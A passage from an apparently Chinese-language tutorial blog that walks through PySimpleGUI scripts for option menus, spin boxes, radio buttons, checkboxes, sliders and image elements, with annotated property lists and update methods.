更新默认选中的元素</span></span><br><span class="line"><span class="string">values=None, # 更新所有显示的文本选项</span></span><br><span class="line"><span class="string">disabled=None, # 更新元素的禁用状态</span></span><br><span class="line"><span class="string">visible=None, # 更新元素的可见状态</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> PySimpleGUI <span class="keyword">as</span> sg</span><br><span class="line">a=[<span class="string">&#x27;python&#x27;</span>,<span class="string">&#x27;java&#x27;</span>,<span class="string">&#x27;c++&#x27;</span>,<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;html&#x27;</span>]</span><br><span class="line"></span><br><span class="line">layout=[</span><br><span class="line">    [sg.T(<span class="string">&#x27;OptionMenu&#x27;</span>),sg.OptionMenu(a,key=<span class="string">&#x27;-OM-&#x27;</span>),</span><br><span class="line">     sg.T(<span class="string">&#x27;Spin&#x27;</span>),sg.Spin(a,key=<span class="string">&#x27;-SP-&#x27;</span>,enable_events=<span class="literal">True</span>)],</span><br><span class="line">    [sg.T(<span class="string">&#x27;语言&#x27;</span>),sg.In(key=<span class="string">&#x27;-YY-&#x27;</span>,size=(<span class="number">25</span>))]</span><br><span class="line"></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">window=sg.Window(<span class="string">&#x27;Python GUI&#x27;</span>, layout)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    event,values=window.read()</span><br><span class="line">    <span class="keyword">if</span> event==<span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> event == <span class="string">&#x27;-SP-&#x27;</span>:</span><br><span class="line">        window[<span class="string">&#x27;-YY-&#x27;</span>].update(values[<span class="string">&#x27;-SP-&#x27;</span>])</span><br><span class="line">window.close()</span><br></pre></td></tr></table></figure>

<h1 id="21单选框的多种布局方法-py"><a href="#21单选框的多种布局方法-py" class="headerlink" title="21单选框的多种布局方法.py"></a>21单选框的多种布局方法.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">单选框的书写方法</span></span><br><span class="line"><span class="string">sg.Radio() or sg.R()</span></span><br><span class="line"><span class="string">举例：list=[&#x27;非常满意&#x27;,&#x27;满意&#x27;,&#x27;一般&#x27;,&#x27;不满意&#x27;]</span></span><br><span class="line"><span class="string">sg.R(i,group_id=1) for i in list</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">For循环快速定义单选框</span></span><br><span class="line"><span class="string">利用for循环从左向右遍历时</span></span><br><span class="line"><span class="string">layout=[[],[],[()for循环]] layout=[[]]+[[]]+[[()for循环]]</span></span><br><span class="line"><span class="string">利用for循环从上向下遍历时</span></span><br><span class="line"><span class="string">layout=[[]]+[[]]+[[]for循环]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">巧用key=(x,y), For循环快速定义单选框</span></span><br><span class="line"><span class="string">从左向右从上向下同时遍历</span></span><br><span class="line"><span class="string">layout=[[sg.R(x,group_id=y,key=(x,y)) for x in list] for y in range(9)]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> PySimpleGUI <span class="keyword">as</span> sg</span><br><span class="line">lista=[<span class="string">&#x27;非常满意&#x27;</span>,<span class="string">&#x27;满意&#x27;</span>,<span class="string">&#x27;一般&#x27;</span>,<span class="string">&#x27;不满意&#x27;</span>]</span><br><span class="line">listb=[<span class="string">&#x27;请对程序员无声的课程内容做出评价：&#x27;</span>,<span class="string">&#x27;请对程序员无声的讲解做出评价：&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># layout=[</span></span><br><span class="line"><span class="comment"># [sg.T(&#x27;1.&#x27;+listb[0])],</span></span><br><span class="line"><span class="comment"># [sg.R(i,group_id=1)for i in lista],</span></span><br><span class="line"><span class="comment"># [sg.T(&#x27;2.&#x27;+listb[1])],</span></span><br><span class="line"><span class="comment"># [sg.R(i,group_id=2)for i in lista]</span></span><br><span class="line"><span class="comment"># ]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># layout=[[sg.T(&#x27;1.&#x27;+listb[0])]]+[[sg.R(i,group_id=1)for i in lista]]\</span></span><br><span class="line"><span class="comment">#        +[[sg.T(&#x27;2.&#x27;+listb[1])]]+[[sg.R(i,group_id=2)for i in lista]]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># layout=[</span></span><br><span class="line"><span class="comment">#     [[sg.R(i,group_id=1)]for i in lista]</span></span><br><span class="line"><span class="comment"># ]</span></span><br><span class="line"></span><br><span class="line">layout=[[sg.T(<span class="built_in">str</span>(y+<span class="number">1</span>))]+[sg.R(x,group_id=y,key=(x,y)) <span class="keyword">for</span> x <span class="keyword">in</span> lista] <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>)]</span><br><span class="line"></span><br><span class="line">window=sg.Window(<span class="string">&#x27;Python GUI&#x27;</span>, layout)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    event,values=window.read()</span><br><span class="line">    <span class="keyword">if</span> event==<span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># if event == &#x27;-SP-&#x27;:</span></span><br><span class="line">    <span class="comment">#     window[&#x27;-YY-&#x27;].update(values[&#x27;-SP-&#x27;])</span></span><br><span class="line">window.close()</span><br></pre></td></tr></table></figure>

<h1 id="22单选框属性的设定及更新方法-py"><a href="#22单选框属性的设定及更新方法-py" class="headerlink" title="22单选框属性的设定及更新方法.py"></a>22单选框属性的设定及更新方法.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">1.单选框属性的设定及更新方法</span></span><br><span class="line"><span class="string">设定方法：sg.R(list,size=(None,None))</span></span><br><span class="line"><span class="string">更新方法：window[key].update()</span></span><br><span class="line"><span class="string">相同组ID的单选框都更新为未选中状态。</span></span><br><span class="line"><span class="string">window[key].ResetGroup()</span></span><br><span class="line"><span class="string">window[key].reset_group()</span></span><br><span class="line"><span class="string">-单选框可设定的属性</span></span><br><span class="line"><span class="string">text, # str 文本用于显示在单选框旁边</span></span><br><span class="line"><span class="string">group_id, # any # 组ID</span></span><br><span class="line"><span class="string">key=None,   # 元素的唯一标识符</span></span><br><span class="line"><span class="string">default=False, # bool如果为True，则默认选中</span></span><br><span class="line"><span class="string">enable_events=True, #  元素的事件属性，如果设定为True,元素列表项目被选中时会发生事件</span></span><br><span class="line"><span class="string">size=(30,6),   # 字符宽度，行高</span></span><br><span class="line"><span class="string">disabled=False, # 元素是否禁用</span></span><br><span class="line"><span class="string">auto_size_text=None,    #   如果为True,元素自动根据内容大小调整</span></span><br><span class="line"><span class="string">font=None,  # 设置字体名称或者大小</span></span><br><span class="line"><span class="string">background_color=None,  #   背景颜色设定</span></span><br><span class="line"><span class="string">text_color=None,    #   字体颜色设定</span></span><br><span class="line"><span class="string">pad=None,   # 元素间隔设定</span></span><br><span class="line"><span class="string">tooltip=None,   # 悬浮文本</span></span><br><span class="line"><span class="string">visible=True,   # 元素可见状态设定</span></span><br><span class="line"><span class="string">-单选框可更新的属性</span></span><br><span class="line"><span class="string">value=None, # 为True时，此单选框被选中，同组的其他选框更新为未选中</span></span><br><span class="line"><span class="string">text, # str 更新显示在按钮旁边的文本</span></span><br><span class="line"><span class="string">background_color=None,  #   更新背景颜色</span></span><br><span class="line"><span class="string">text_color=None,    #   更新文本颜色</span></span><br><span class="line"><span class="string">disabled=None, # 更新元素的禁用状态</span></span><br><span class="line"><span class="string">visible=None, # 更新元素的可见状态</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2.单选框如何获取被选定的值(文本)</span></span><br><span class="line"><span class="string">items()函数：将字典里的（键，值）转换为元组</span></span><br><span class="line"><span class="string">获取方法：</span></span><br><span class="line"><span class="string">for k,v in dict:</span></span><br><span class="line"><span class="string">if v == True:</span></span><br><span class="line"><span class="string">print(k)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> PySimpleGUI <span class="keyword">as</span> sg</span><br><span class="line">lista=[<span class="string">&#x27;非常满意&#x27;</span>,<span class="string">&#x27;满意&#x27;</span>,<span class="string">&#x27;一般&#x27;</span>,<span class="string">&#x27;不满意&#x27;</span>]</span><br><span class="line"></span><br><span class="line">layout=[</span><br><span class="line">    [sg.T(<span class="string">&#x27;请对程序员无声的课程做出评价：&#x27;</span>)],</span><br><span class="line">    [sg.R(i,group_id=<span class="number">1</span>,key=i) <span class="keyword">for</span> i <span class="keyword">in</span> lista],</span><br><span class="line">    [sg.B(<span class="string">&#x27;确认提交&#x27;</span>)]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">window=sg.Window(<span class="string">&#x27;Python GUI&#x27;</span>, layout)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    event,values=window.read()</span><br><span class="line">    <span class="keyword">if</span> event==<span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> event == <span class="string">&#x27;确认提交&#x27;</span>:</span><br><span class="line">        <span class="comment"># window[&#x27;满意&#x27;].ResetGroup()</span></span><br><span class="line">        <span class="comment"># window[&#x27;满意&#x27;].update(value=True)</span></span><br><span class="line">        <span class="keyword">for</span> k,v <span class="keyword">in</span> values.items():</span><br><span class="line">            <span class="keyword">if</span> v == <span class="literal">True</span>:</span><br><span class="line">                <span class="built_in">print</span>(k)</span><br><span class="line"></span><br><span class="line">window.close()</span><br></pre></td></tr></table></figure>

<h1 id="23复选框的设定及更新方法-py"><a href="#23复选框的设定及更新方法-py" class="headerlink" title="23复选框的设定及更新方法.py"></a>23复选框的设定及更新方法.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">书写方法：sg.Checkbox() or sg.CB()</span></span><br><span class="line"><span class="string">更新方法：window[key].update()</span></span><br><span class="line"><span class="string">-复选框可设定的属性</span></span><br><span class="line"><span class="string">text, # str 文本用于显示在单选框旁边</span></span><br><span class="line"><span class="string">key=None,   # 元素的唯一标识符</span></span><br><span class="line"><span class="string">default=False, # bool如果为True，则默认选中</span></span><br><span class="line"><span class="string">enable_events=True, #  元素的事件属性，如果设定为True,元素列表项目被选中时会发生事件</span></span><br><span class="line"><span class="string">size=(30,6),   # 字符宽度，行高</span></span><br><span class="line"><span class="string">disabled=False, # 元素是否禁用</span></span><br><span class="line"><span class="string">auto_size_text=None,    #   如果为True,元素自动根据内容大小调整</span></span><br><span class="line"><span class="string">font=None,  # 设置字体名称或者大小</span></span><br><span class="line"><span class="string">background_color=None,  #   背景颜色设定</span></span><br><span class="line"><span class="string">text_color=None,    #   字体颜色设定</span></span><br><span class="line"><span class="string">pad=None,   # 元素间隔设定</span></span><br><span class="line"><span class="string">tooltip=None,   # 悬浮文本</span></span><br><span class="line"><span class="string">visible=True,   # 元素可见状态设定</span></span><br><span class="line"><span class="string">-复选框可更新的属性</span></span><br><span class="line"><span class="string">value=None, # 为True时，此单选框被选中，同组的其他选框更新为未选中</span></span><br><span class="line"><span class="string">text, # str 更新显示在按钮旁边的文本</span></span><br><span class="line"><span class="string">background_color=None,  #   更新背景颜色</span></span><br><span class="line"><span class="string">text_color=None,    #   更新文本颜色</span></span><br><span class="line"><span class="string">disabled=None, # 更新元素的禁用状态</span></span><br><span class="line"><span class="string">visible=None, # 更新元素的可见状态</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> PySimpleGUI <span class="keyword">as</span> sg</span><br><span class="line">lista=[<span class="string">&#x27;非常满意&#x27;</span>,<span class="string">&#x27;满意&#x27;</span>,<span class="string">&#x27;一般&#x27;</span>,<span class="string">&#x27;不满意&#x27;</span>]</span><br><span class="line"></span><br><span class="line">layout=[</span><br><span class="line">    [sg.T(<span class="string">&#x27;请对程序员无声的课程做出评价：&#x27;</span>)],</span><br><span class="line">    [sg.CB(i,key=i) <span class="keyword">for</span> i <span class="keyword">in</span> lista],</span><br><span class="line">    [sg.B(<span class="string">&#x27;确认提交&#x27;</span>)]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">window=sg.Window(<span class="string">&#x27;Python GUI&#x27;</span>, layout)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    event,values=window.read()</span><br><span class="line">    <span class="keyword">if</span> event==<span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> event == <span class="string">&#x27;确认提交&#x27;</span>:</span><br><span class="line">        <span class="comment"># window[&#x27;满意&#x27;].ResetGroup()</span></span><br><span class="line">        <span class="comment"># window[&#x27;满意&#x27;].update(value=True)</span></span><br><span class="line">        <span class="keyword">for</span> k,v <span class="keyword">in</span> values.items():</span><br><span class="line">            <span class="keyword">if</span> v == <span class="literal">True</span>:</span><br><span class="line">                <span class="built_in">print</span>(k)</span><br><span class="line"></span><br><span class="line">window.close()</span><br></pre></td></tr></table></figure>

<h1 id="24滑块元素的设定方法-py"><a href="#24滑块元素的设定方法-py" class="headerlink" title="24滑块元素的设定方法.py"></a>24滑块元素的设定方法.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">书写方法：</span></span><br><span class="line"><span class="string">sg.Slider()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> PySimpleGUI <span class="keyword">as</span> sg</span><br><span class="line"></span><br><span class="line">layout=[</span><br><span class="line">    [sg.Slider(</span><br><span class="line">        <span class="built_in">range</span>=(<span class="number">100</span>,<span class="number">500</span>), <span class="comment"># 滑块范围（最小值，最大值）</span></span><br><span class="line">        key=<span class="literal">None</span>, <span class="comment"># 元素的唯一标识符</span></span><br><span class="line">        default_value=<span class="number">200</span>, <span class="comment"># 滑块初始所处位置</span></span><br><span class="line">        resolution=<span class="number">10</span>, <span class="comment"># 滑块值变动的最小单位值</span></span><br><span class="line">        tick_interval=<span class="number">50</span>,<span class="comment"># 刻度值标记</span></span><br><span class="line">        orientation=<span class="string">&#x27;h&#x27;</span>, <span class="comment"># 方向设定  水平方向或者垂直方向，有效值&#x27;horizontal&#x27; or &#x27;vertical&#x27;，支持简写：&#x27;h&#x27; or &#x27;v&#x27;</span></span><br><span class="line">        disable_number_display=<span class="literal">False</span>, <span class="comment"># 默认为False，如果为True，滑块旁的数字不显示</span></span><br><span class="line">        border_width=<span class="literal">None</span>, <span class="comment"># 边界线宽度</span></span><br><span class="line">        relief=<span class="literal">None</span>, <span class="comment"># 浮雕设计&#x27;raised&#x27;, &#x27;sunken&#x27;, &#x27;flat&#x27;, &#x27;ridge&#x27;, &#x27;solid&#x27;, &#x27;groove&#x27;,</span></span><br><span class="line">        size=(<span class="number">30</span>,<span class="number">6</span>),   <span class="comment"># 宽度，行高</span></span><br><span class="line">        font=<span class="literal">None</span>,  <span class="comment"># 设置字体名称或者大小</span></span><br><span class="line">        background_color=<span class="literal">None</span>,  <span class="comment">#   背景颜色设定</span></span><br><span class="line">        text_color=<span class="literal">None</span>,    <span class="comment">#   字体颜色设定</span></span><br><span class="line">        pad=<span class="literal">None</span>,   <span class="comment"># 元素间隔设定</span></span><br><span class="line">        tooltip=<span class="literal">None</span>,   <span class="comment"># 悬浮文本</span></span><br><span class="line">        visible=<span class="literal">True</span>,   <span class="comment"># 元素可见状态设定</span></span><br><span class="line">    )]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">window=sg.Window(<span class="string">&#x27;Python GUI&#x27;</span>, layout)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    event,values=window.read()</span><br><span class="line">    <span class="keyword">if</span> event==<span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">window.close()</span><br></pre></td></tr></table></figure>

<h1 id="25滑块元素的更新方法-py"><a href="#25滑块元素的更新方法-py" class="headerlink" title="25滑块元素的更新方法.py"></a>25滑块元素的更新方法.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">window[key].update()</span></span><br><span class="line"><span class="string">window[key].Update()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">可更新的属性</span></span><br><span class="line"><span class="string">value=None, # int or float</span></span><br><span class="line"><span class="string">range=(None,None), # (int,int) or (float,float)</span></span><br><span class="line"><span class="string">disabled=None, # bool</span></span><br><span class="line"><span class="string">visible=None # bool</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> PySimpleGUI <span class="keyword">as</span> sg</span><br><span class="line"></span><br><span class="line">layout=[</span><br><span class="line">    [sg.Slider(key=<span class="string">&#x27;-S-&#x27;</span>,)],</span><br><span class="line">    [sg.B(<span class="string">&#x27;update&#x27;</span>)]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">window=sg.Window(<span class="string">&#x27;Python GUI&#x27;</span>, layout)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    event,values=window.read()</span><br><span class="line">    <span class="keyword">if</span> event==<span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> event == <span class="string">&#x27;update&#x27;</span>:</span><br><span class="line">        window[<span class="string">&#x27;-S-&#x27;</span>].update(</span><br><span class="line">            value=<span class="literal">None</span>, <span class="comment"># int or float滑块初始所处位置</span></span><br><span class="line">            <span class="built_in">range</span>=(<span class="number">100</span>,<span class="number">500</span>), <span class="comment"># 滑块范围(最小值，最大值)</span></span><br><span class="line">            disabled=<span class="literal">None</span>, <span class="comment"># bool 元素的禁用状态</span></span><br><span class="line">            visible=<span class="literal">None</span>, <span class="comment"># 元素是否显示</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">window.close()</span><br></pre></td></tr></table></figure>

<h1 id="26图片元素的多种书写方式-py"><a href="#26图片元素的多种书写方式-py" class="headerlink" title="26图片元素的多种书写方式.py"></a>26图片元素的多种书写方式.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">书写方法：</span></span><br><span class="line"><span class="string">sg.Image(filename=&#x27;图片路径&#x27;) # 图片路径仅支持GIF和PNG</span></span><br><span class="line"><span class="string">for循环布局多张图片的方法：</span></span><br><span class="line"><span class="string">横向 [sg.Image(filename=img+f&#x27;&#123;i&#125;.png&#x27;) for i in range(1,4)]</span></span><br><span class="line"><span class="string">纵向 [[sg.Image(filename=img+f&#x27;&#123;i&#125;.png&#x27;)] for i in range(1,4)]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">f-string格式化字符串常量</span></span><br><span class="line"><span class="string">python3.6新引入的一种字符串格式化方法。目的是使格式化字符串的操作更加简便。</span></span><br><span class="line"><span class="string">大括号&#123;&#125;标明被替换的字段</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> PySimpleGUI <span class="keyword">as</span> sg</span><br><span class="line">img=<span class="string">r&quot;c:\bl&quot;</span></span><br><span class="line">layout=[</span><br><span class="line">    [[sg.Image(filename=img+<span class="string">f&#x27;<span class="subst">&#123;i&#125;</span>.png&#x27;</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>)]</span><br><span class="line">    <span class="comment"># [sg.Image(filename=img)]</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">window=sg.Window(<span class="string">&#x27;Python GUI&#x27;</span>, layout)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    event,values=window.read()</span><br><span class="line">    <span class="keyword">if</span> event==<span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">window.close()</span><br></pre></td></tr></table></figure>

<h1 id="27图片元素的设定及更新方法-py"><a href="#27图片元素的设定及更新方法-py" class="headerlink" title="27图片元素的设定及更新方法.py"></a>27图片元素的设定及更新方法.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">图片元素可设定的属性</span></span><br><span class="line"><span class="string">filename=None, # 图片路径仅支持GIF和PNG</span></span><br><span class="line"><span class="string">data=None, # base64编码的字符串</span></span><br><span class="line"><span class="string">background_color=None,  # 背景颜色设定</span></span><br><span class="line"><span class="string">size=(None,None) # 图片宽度和高度设定(pix)</span></span><br><span class="line"><span class="string">pad=None, # 和周围元素间的间隔（（左右）（上下））</span></span><br><span class="line"><span class="string">key=None, # 元素的唯一标识符</span></span><br><span class="line"><span class="string">tooltip=None,   # 悬浮文本</span></span><br><span class="line"><span class="string">visible=True,   # 元素可见状态设定</span></span><br><span class="line"><span class="string">right_click_menu=None, # 右击调出菜单</span></span><br><span class="line"><span class="string">enable_events=False, # 元素事件属性，默认为False</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">更新方法及可更新的属性</span></span><br><span class="line"><span class="string">window[key].update()</span></span><br><span class="line"><span class="string">window[key].Update()</span></span><br><span class="line"><span class="string">filename=None, # 更新图片路径</span></span><br><span class="line"><span class="string">data=None, # 更新base64编码的字符串</span></span><br><span class="line"><span class="string">visible=True,   # 更新元素可见状态</span></span><br><span class="line"><span class="string">size=(None,None) # 图片宽度和高度设定(pix)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">图片元素的动图更新方法</span></span><br><span class="line"><span class="string">window[key].update_animation()</span></span><br><span class="line"><span class="string">window[key].UpdateAnimation()</span></span><br><span class="line"><span class="string">可更新的属性：</span></span><br><span class="line"><span class="string">source, # 包含动画GIF的文件名或Base64编码的字符串</span></span><br><span class="line"><span 